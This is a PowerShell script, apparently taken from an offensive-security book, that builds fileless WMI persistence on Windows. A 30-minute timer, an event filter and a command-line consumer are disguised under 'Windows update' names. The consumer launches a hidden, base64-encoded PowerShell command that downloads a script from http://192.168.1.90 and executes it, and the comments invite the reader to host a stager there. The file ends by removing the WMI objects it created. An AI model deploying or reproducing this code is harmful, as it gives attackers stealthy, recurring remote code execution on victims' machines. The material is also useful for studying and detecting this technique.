#
# Fileless persistence technique using WMI filters
# Every 30 minutes this code will download a file called script.txt from a remote connection and execute its content
# If you want to execute a stager, simply put the code in script.txt on your remote server
#
# @Author: Sparc Flow in "How to Hack a Fashion Brand"
#
$TimerArgs = @{
    IntervalBetweenEvents = ([UInt32] 1800000) # 30 min
    SkipIfPassed = $False
    TimerId ="Trigger" }

$Timer = Set-WmiInstance -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments $TimerArgs

$EventFilterArgs = @{
         EventNamespace = 'root/cimv2'
         Name = "Windows update trigger"
         Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'Trigger'"
    QueryLanguage = 'WQL'
}

$Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

$payload = '$browser=New-Object System.Net.WebClient; $browser.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX($browser.DownloadString("http://192.168.1.90/script.txt"));'

$EncodedPayload = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
#$FinalPayload = "powershell.exe -NoP -sta -NonI -W Hidden -enc $EncodedPayload"
$FinalPayload = "powershell.exe -NoP -W Hidden -enc $EncodedPayload"
write-output $FinalPayload | out-file enc.ps1

$CommandLineConsumerArgs = @{
    Name = "Windows update consumer"
    CommandLineTemplate = $FinalPayload
}

$Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}

$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

Start-Sleep -s 20

$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'Windows update consumer'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'Windows update trigger'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"
$TimerToCleanup = Get-WmiObject -Namespace root/cimv2 -Class __IntervalTimerInstruction -Filter "TimerId = 'Trigger'"

$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
$TimerToCleanup | Remove-WmiObject
